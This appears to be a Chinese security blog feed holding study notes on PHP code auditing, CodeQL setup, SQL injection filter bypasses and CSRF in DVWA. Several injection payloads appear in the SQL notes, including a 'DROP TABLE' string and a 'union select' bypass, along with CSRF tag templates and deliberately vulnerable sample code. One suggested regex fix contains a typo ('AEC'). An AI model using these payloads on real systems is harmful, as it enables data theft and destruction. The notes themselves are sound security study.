    
    
    <entry>
      <title>代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8824%E6%97%A5-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8824%E6%97%A5-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include/require/include_once/require_once/sql_autoload</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents/fread/readfile/file/highlight_file/show_source</span><br></pre></td></tr></table></figure><h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents/fwrite/mkdir/fputs</span><br></pre></td></tr></table></figure><h4 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink/rmdir</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_dile/copy/rename</span><br></pre></td></tr></table></figure><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传流程</p><ol><li>检查文件大小，后缀，类型</li><li>检查文件内容（图片头）</li><li>提取文件后缀</li><li>生成新文件名</li><li>将上传临时文件拷贝到新文件名位置</li></ol><h3 id="逻辑常见错误"><a href="#逻辑常见错误" class="headerlink" title="逻辑常见错误"></a>逻辑常见错误</h3><ul><li>只检查文件类型而不检查后缀，文件头</li><li>文件后缀黑名单泄露</li><li>使用原始文件名导致\0截断漏洞</li></ul><h4 id="啥都没过滤"><a href="#啥都没过滤" class="headerlink" title="啥都没过滤"></a>啥都没过滤</h4><p><a href="https://php.mengsec.com/bugs/wooyun-2015-0125592.html">https://php.mengsec.com/bugs/wooyun-2015-0125592.html</a></p><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p><a href="https://php.mengsec.com/bugs/wooyun-2015-0125592.html">https://php.mengsec.com/bugs/wooyun-2015-0125592.html</a></p><p>文件上传</p><p><img src="https://pic.imgdb.cn/item/66f40c28f21886ccc002a851.png" alt=""></p><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>php的5.4.7之前可以使用<code>\00截断</code></p><p>就是当你上传文件名韦<code>1.php\xoo1.gif</code></p><p>检测到尾缀就为.gif，但是实际上识别到的文件是1.php，这就导致了文件上传漏洞</p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>文件包含漏洞!=文件读取漏洞</p><p>文件包含&gt;文件读取</p><p>常见位置：</p><ul><li>模板文件名</li><li>语言文件名</li></ul><p>文件包含漏洞限制</p><ul><li>寻找可被包含的文件： 上传文件、临时文件、Session文件、日志文件、</li><li>啥都没过滤，或者利用协议</li></ul><h3 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h3><p><a href="https://paper.seebug.org/411/">https://paper.seebug.org/411/</a></p><ul><li>删除任意文件.dos服务器</li><li>删除安装所文件，导致目标环境可被重新安装</li><li>重新安装-&gt;任意管理员账号密码重置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计sql注入</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8821%E6%97%A5-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8821%E6%97%A5-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="java代码审计"><a href="#java代码审计" class="headerlink" title="java代码审计"></a>java代码审计</h1><h2 id="codeql安装"><a href="#codeql安装" class="headerlink" title="codeql安装"></a>codeql安装</h2><p>从github下载cil文件</p><p><a href="https://github.com/github/codeql-cli-binaries/releases">cli文件release地址</a></p><p>下载下来以后找一个没有中文的路径解压缩安放</p><p> 再从github下载工作车间</p><p><a href="https://github.com/github/vscode-codeql-starter">工作车间</a></p><p>注意下载的时候不要直接clone，因为他不只有这个还包括其下的子项目</p><p>使用vscode的图形化界面的话需要先在vscode安装插件codeql（不是很理解为什么jetbrains的要收费，适用的那个也是乱七八糟的）</p><p>在插件设置中配置codeql的二进制文件</p><p><img src="https://pic.imgdb.cn/item/66ee6ed0f21886ccc00e24bb.png" alt=""></p><p>再系统环境变量中添加codeql的bin文件地址</p><p>这样codeql就配置好了</p><p>后面就是创建数据库的过程，我尝试的是这个项目<br> <a href="https://github.com/godzeo/java-sec-code">java-sec-code</a></p><p>执行codeql命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/zy/Documents/project/codeql/vscode-codeql-starter-main/database/codeql_java-sec-code  --language=&quot;java&quot;  --command=&quot;mvn clean install --file pom.xml&quot; --source-root=/Users/zy/Documents/project/sec_java_vul/java-sec-code</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>这里面，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">codeql database create  /Users/zy/Documents/project/codeql/vscode-codeql-starter-main/database/codeql_java-sec-code</span><br><span class="line"></span><br><span class="line">创建一个在/Users/zy/Documents/project/codeql/vscode-codeql-starter-main/database/名为codeql_java-sec-code的数据库</span><br><span class="line"></span><br><span class="line">--language=&quot;java&quot;  使用的是java的语言</span><br><span class="line"></span><br><span class="line">--command=&quot;mvnb clean install --file pom.xml&quot;利用命令进行源码编译</span><br><span class="line"></span><br><span class="line">--source-root= 设置源码的路径</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>如果能成功的话会输出Successfully created database at xxxxxx的，需要注意的是不是每个项目都可以使用codeql进行审计，codeql是将代码转化成类似数据库的形式，并基于该database进行分析</p><p>然后再codeql的插件中选择你刚刚建立的数据库文件夹</p><p><img src="https://pic.imgdb.cn/item/66ee71e6f21886ccc011bb88.png" alt=""></p><p>官方制定了一下规则可以使用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ql/java/ql/src/Security                 放着一些官方的规则(java)，可直接用。</span><br><span class="line">/ql/java/ql/src/experimental/Security  一些还在实验中的规则(java)。</span><br></pre></td></tr></table></figure></p><p>找到代码的进行运行，跑出来了就是成功了</p><p><img src="https://pic.imgdb.cn/item/66ee723ff21886ccc01221d8.png" alt=""></p><p>php手工调试<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">万金油函数</span><br><span class="line">var_dump       将当前变量值或者函数返回结果dump出来</span><br><span class="line"></span><br><span class="line">查看上下文内容</span><br><span class="line">- get_defined_functions</span><br><span class="line">- get_defined_vars   获取当前运行php的所有变量</span><br><span class="line">- get_defined_constants</span><br><span class="line">- get_included_files</span><br><span class="line">- get_loaded_extensions</span><br><span class="line">- get_Declared_classes</span><br><span class="line">- get_Declared_interfaces</span><br><span class="line"></span><br><span class="line">查看函数调用过程</span><br><span class="line">- debug_backtrace</span><br><span class="line">- debug_print_backtrace</span><br><span class="line"></span><br><span class="line">Xdebug手工调试</span><br><span class="line">- xdebug_call_file 获取调用当前函数的文件</span><br><span class="line">- xdebug_call_line 获取调用当前函数文件的行</span><br><span class="line">- xdebug_call_function 获取调用当前函数的函数</span><br><span class="line">- xdebug_dump_superglobals 获取所有超全局变量</span><br><span class="line">- xdebug_get_monitored_functions 监控函数调用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>影响php安全的全局配置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">- magic_quote_gpc:5.3后废弃,5.4后移除</span><br><span class="line">将所有变量进行转义</span><br><span class="line"></span><br><span class="line">- register_global:4.2后默认false</span><br><span class="line">将用户传入的变量被直接的注册为全局变量直接使用</span><br><span class="line"></span><br><span class="line">- allow_url_include:默认false</span><br><span class="line">允许url包括远程文件，可能导致csrf，xss</span><br><span class="line"></span><br><span class="line">- allow_url_fopen:默认true</span><br><span class="line">允许url读取远程文件</span><br><span class="line"></span><br><span class="line">- request_order:5,3后从gpc改为gp</span><br><span class="line">指定 PHP 在处理 HTTP 请求参数</span><br><span class="line"></span><br><span class="line">- show_open_tag：5.4+，无论是够开始&lt;?=...?&gt;都是可以运行的</span><br><span class="line">用于控制是否允许使用短标签</span><br><span class="line"></span><br><span class="line">- safe_mode(5.4移除)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- open_basedir</span><br><span class="line">限制 PHP 脚本对文件系统的访问范围</span><br><span class="line"></span><br><span class="line">- disable_functions/disable_classes</span><br><span class="line"> PHP 中禁用特定的内置函数\类</span><br><span class="line"></span><br><span class="line">- enable_dl（5.2默认false）</span><br><span class="line">是否允许加载拓展</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66ee8818f21886ccc02858ab.png" alt=""></p><h2 id="代码审计的sql注入"><a href="#代码审计的sql注入" class="headerlink" title="代码审计的sql注入"></a>代码审计的sql注入</h2><ul><li>反向查找流程<ul><li>通过可控变量（输入点）回溯危险函数</li><li>查找危险函数可控变量</li><li>传递的过程中触发漏洞<br>无法挖掘逻辑漏洞等<br>命中率低<br>适应性较差：不适合全局过滤的站点</li></ul></li></ul><ul><li>正向查找流程<ul><li>从入口点函数触发</li><li>找到控制器，理解url派发规则</li><li>跟踪控制器调用，以理解代码为目标进行源码阅读</li><li>阅读代码的过程中可能发现漏洞</li></ul></li></ul><h2 id="php-sql注入漏洞技巧"><a href="#php-sql注入漏洞技巧" class="headerlink" title="php sql注入漏洞技巧"></a>php sql注入漏洞技巧</h2><h3 id="php-mysql连接方式"><a href="#php-mysql连接方式" class="headerlink" title="php+mysql连接方式"></a>php+mysql连接方式</h3><p>PDO<br>Mysqli<br>Mysql（废弃）没有预编译</p><h3 id="sql注入常见过滤方法"><a href="#sql注入常见过滤方法" class="headerlink" title="sql注入常见过滤方法"></a>sql注入常见过滤方法</h3><p>intval/addslashes/mysql_real_escape<br>mysqli_escape_string/mysqli_real_escape_string/mysqli::escape_string<br>PDO::quote<br>参数化查询</p><h2 id="常见注入过滤绕过方法"><a href="#常见注入过滤绕过方法" class="headerlink" title="常见注入过滤绕过方法"></a>常见注入过滤绕过方法</h2><p>1.</p><ul><li>intval                将变量的值转换为整数</li><li>addslashes            用于对字符串中的特殊字符进行转义，包括单引号 (‘)、双引号 (“)、反斜杠 ()、NULL 字符等<br><img src="https://pic.imgdb.cn/item/66ef842ef21886ccc018df58.png" alt=""></li><li>mysql_real_escape<br><img src="https://pic.imgdb.cn/item/66ef8566f21886ccc019f995.png" alt=""></li></ul><p>绕过方式:<br>宽字节注入<br>寻找字符串转换函数</p><ul><li>urldecode</li><li>base64_Decode</li><li>iconv</li><li>json_decode</li><li>stripshasles</li><li>simple_xml_loadstring<br><img src="https://pic.imgdb.cn/item/66ef9128f21886ccc024cfe2.png" alt=""><br>这里的’id’如果不加上引号的话，转义就没有意义，因为可以通过数字型</li></ul><p><code>1 union select xxxx from xxxx</code></p><p>进行绕过</p><p>2.</p><ul><li>mysqli::escape_string /PDO::quote<ul><li>与addslashes差别：是否会主动加引号包裹</li><li>宽字符注入</li></ul></li></ul><p>3.</p><ul><li>参数化查询<ul><li>寻找非sql值位置</li><li>SELECT <code>name</code> FROM <code>user</code> WHERE <code>id</code>=?ORDER BY <code>login_time</code> LIMIT 1<br>上面的中只有?的地方是可以预编译的，其他的可以被用户控制的地方仍然可能存在sql注入漏洞</li></ul></li></ul><h4 id="举例1"><a href="#举例1" class="headerlink" title="举例1"></a>举例1</h4><p>贷齐乐header注入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function t($text)&#123;</span><br><span class="line">$text = nl2br($text);</span><br><span class="line">$text = real_strip_tags($text);</span><br><span class="line">$text = addslashes($text);</span><br><span class="line">$text = trim($text);</span><br><span class="line">return $text;</span><br></pre></td></tr></table></figure></p><p>分析<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nl2br($text):</span><br><span class="line"></span><br><span class="line">将文本中的换行符 \n 转换为 HTML 的 &lt;br&gt; 标签，以便在网页上正确显示换行。</span><br><span class="line">real_strip_tags($text):</span><br><span class="line"></span><br><span class="line">假设这是一个自定义函数，用于移除文本中的 HTML 标签。通常用来防止XSS攻击和清理输入数据。</span><br><span class="line">addslashes($text):</span><br><span class="line"></span><br><span class="line">在特殊字符（如单引号、双引号、反斜杠）前添加反斜杠。通常用于准备将文本插入数据库，防止SQL注入。</span><br><span class="line">trim($text):</span><br><span class="line"></span><br><span class="line">移除文本两端的空白字符，包括空格、制表符和换行符。</span><br><span class="line">返回值</span><br></pre></td></tr></table></figure></p><p>在整个函数中，只有addslashes函数对sql进行了限制</p><h4 id="举例2"><a href="#举例2" class="headerlink" title="举例2"></a>举例2</h4><p>metinfo企业网站管理系统SQL注入漏洞<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($p)&#123;</span><br><span class="line">   $array = explode(&#x27;.&#x27;,base64_decode($p));</span><br><span class="line">   $sql=&quot;SELECT * FROM $met_admin_table WHERE admin_id=&#x27;&quot;.$array[0].&quot;&#x27;&quot;;</span><br><span class="line">   $sqlarray = $db-&gt;get_one($sql);</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66f0065cf21886ccc09bc433.png" alt=""></p><h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><p>开发者容易忽略的注入点<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">· http头</span><br><span class="line">  X-Forwarded-For</span><br><span class="line">  User-Agent</span><br><span class="line">  Referer</span><br><span class="line">· PHP_SELF</span><br><span class="line">· 文件名$_FILES[][name]</span><br><span class="line">· REQUEST_URI</span><br><span class="line">· php：//input</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/66f007aff21886ccc09d5834.png" alt=""><br>这个<br><code>PHP_SELF</code><br>是用户可控的<br><img src="https://pic.imgdb.cn/item/66f007eaf21886ccc09d9622.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66f00835f21886ccc09dded4.png" alt=""></p><p>和上一个一样，但是是用户可传的完整路径</p><p>引入单引号（转义符）的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">stripslashes</span><br><span class="line"></span><br><span class="line">base64_decode</span><br><span class="line"></span><br><span class="line">urldecode</span><br><span class="line"></span><br><span class="line">substr</span><br><span class="line"></span><br><span class="line">iconv</span><br><span class="line"></span><br><span class="line">str_Replace(&#x27;0&#x27;,&#x27;,$sql&#x27;)</span><br><span class="line"></span><br><span class="line">xml</span><br><span class="line"></span><br><span class="line">json_decode</span><br></pre></td></tr></table></figure><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>1.<br><img src="https://pic.imgdb.cn/item/66f0187af21886ccc0ade027.png" alt=""></p><p>这个中存在最easy的sql注入，在这个项目中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$query = &quot;SELECT name,age,email,country FROM user_details WHERE name=&#x27;&#123;$name&#125;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>直接获取了get中name的值然后传给query的sql语句中，在这里可以进行sql注入</p><p>2.</p><p><img src="https://pic.imgdb.cn/item/66f029aef21886ccc0c0fd46.png" alt=""></p><p>除了宽字节基本没啥漏洞，除非用的是GBK</p><p>3.<br><img src="https://pic.imgdb.cn/item/66f02c11f21886ccc0c37c5c.png" alt=""></p><p>可以防御sql，需要设置</p><p><img src="https://pic.imgdb.cn/item/66f02c6df21886ccc0c3e074.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENT_QUOTES是在参数的第二位flag参数设置</span><br></pre></td></tr></table></figure><p>所以这个其实也是存在sql注入的</p><p>4.<br><img src="https://pic.imgdb.cn/item/66f02f2bf21886ccc0c6d136.png" alt=""></p><p>这个也是存在sql注入的，他虽然做了转义但是没有在后面就行’’的处理导致age裸露在外面</p><p>5.<br><img src="https://pic.imgdb.cn/item/66f105ccf21886ccc0793660.png" alt=""></p><p>这个也是存在sql的</p><p><img src="https://pic.imgdb.cn/item/67075cacd29ded1a8c6161cc.png" alt=""></p><p>6.<br><img src="https://pic.imgdb.cn/item/66f12e81f21886ccc0a16d88.png" alt=""></p><p>这个是将字符串变成数字，包没有漏洞</p><p>7.<br><img src="https://pic.imgdb.cn/item/66f15b14f21886ccc0cd5101.png" alt=""></p><p>这个一眼有，这里intval是没用的，他仍然将<code>$_GET[&#39;id&#39;]</code>传入</p><p>8.<br><code>id_numeric</code>判断用户输入是不是输入的数字或数字字符串</p><p><img src="https://pic.imgdb.cn/item/66f15d35f21886ccc0cf514b.png" alt=""></p><p>这里其实是存在的</p><p>他没有在返回404以后组织运行，后面的还是继续会执行的</p><p>把后面的<code>$wuery</code>放在else里面会更好一点</p><p>9.<br>就是在8的后面header后面加了个exit，这个就没有了</p><p>10.<br><img src="https://pic.imgdb.cn/item/66f15f44f21886ccc0d154ca.png" alt=""></p><p>我看着像是没有，但是是有的</p><p>属于是防了，但没完全防</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果我输入这样子的</span><br><span class="line">order=ASC; DROP TABLE user_details; --</span><br><span class="line">他就会变成</span><br><span class="line">SELECT name, age, email, country FROM user_details ORDER BY id ASC; DROP TABLE user_details; --</span><br><span class="line"></span><br><span class="line">还是会删除user_details表</span><br></pre></td></tr></table></figure><p>11.<br><img src="https://pic.imgdb.cn/item/66f16b81f21886ccc0dd681e.png" alt=""></p><p>这个地方正则不对，他只判断是是否是存在这个<code>/DESC/ASC/i</code>而不是只有这个，我们可与i进行sql注入以后在后面接一个desc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3# DESC</span><br></pre></td></tr></table></figure><p>想要修改的话，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/^(DESC|AEC)$/i&#x27;,$order))&#123;</span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/66f16d35f21886ccc0df23a4.png" alt=""></p><p>12.<br><img src="https://pic.imgdb.cn/item/66f16e76f21886ccc0e063b1.png" alt=""></p><p>没有漏洞，非常标准的预编译的</p><p>在SQL语句中使用占位符 ?，并在 execute() 方法中传递参数数组 <code>[$name]</code>。这样可以确保用户输入的数据不会直接插入到SQL语句中，从而避免SQL注入攻击。</p><p>13.<br><img src="https://pic.imgdb.cn/item/66f16eddf21886ccc0e0ce0b.png" alt=""></p><p>有sql注入漏洞，他给的评价是，这里的<code>urldecode,或者base64_Decode会引入新的单引号进行注入使得前面的addslashes无效</code></p><p><img src="https://pic.imgdb.cn/item/66f16ff1f21886ccc0e1e800.png" alt=""></p><p>至此，sql的php代审结束</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csrf</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8820%E6%97%A5-csrf/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8820%E6%97%A5-csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p>csrf跨站请求伪造,也成为one-click attack或session riding</p><h2 id="攻击流程图"><a href="#攻击流程图" class="headerlink" title="攻击流程图"></a>攻击流程图</h2><p><img src="https://pic.imgdb.cn/item/66ed163ff21886ccc0d2f060.png" alt=""></p><h2 id="常见伪造请求"><a href="#常见伪造请求" class="headerlink" title="常见伪造请求"></a>常见伪造请求</h2><p>GET 类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&#x27;evilurl&#x27;&gt;</span><br><span class="line">&lt;img src=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;script src=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;url=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;video src=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;audio src=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;a href=&quot;evilurl&quot;&gt;</span><br><span class="line">&lt;table background=&quot;evilurl&quot;&gt;</span><br></pre></td></tr></table></figure><p>上述中evilurl都是可以替换成恶意csrf蕴含的url</p><p>在dvwa中<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;密码已更改.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;密码不匹配.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>并没验证referer和session等等，所以就存在csrf漏洞</p><p>如果遇到csrf的referer验证</p><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>直接在流量包中修改referer，前提是你知道人家的referer是啥</p><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>使用burpsuite生成csrf漏洞poc，在本地报错成他的referer名字，使用python启一个服务器，访问这个poc的文件地址，感觉就是url带有referer，他正则匹配的时候匹配到了就成了</p><h2 id="jsonp-hijacking攻击"><a href="#jsonp-hijacking攻击" class="headerlink" title="jsonp hijacking攻击"></a>jsonp hijacking攻击</h2>]]></content>
      
      
      <categories>
          
          <category> csrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计---java基础</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8819%E6%97%A5-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8819%E6%97%A5-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
